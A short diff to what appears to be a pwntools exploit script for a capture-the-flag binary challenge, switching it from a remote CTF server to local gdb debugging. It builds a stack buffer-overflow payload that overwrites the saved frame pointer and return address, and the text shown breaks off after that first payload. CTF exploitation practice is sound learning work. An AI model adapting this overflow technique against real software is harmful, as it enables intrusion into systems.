@@ -1,14 +1,14 @@
 from pwn import *
 
-# context.log_level = 'debug'
-# context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
 
-# p = gdb.debug('./chall', '''
-#     b *(vuln+51)
-#     continue
-# ''')
+p = gdb.debug('./chall', '''
+    b *(vuln+51)
+    continue
+''')
 
-p = remote('chall.lac.tf', 31593)
+# p = remote('chall.lac.tf', 31593)
 
 p.recvuntil(b"Hey there, I'm deaddead. Who are you?\n")
 payload1 = b'A' * 0x20 + p64(0x404540+0x1f) + p64(0x4012c1)
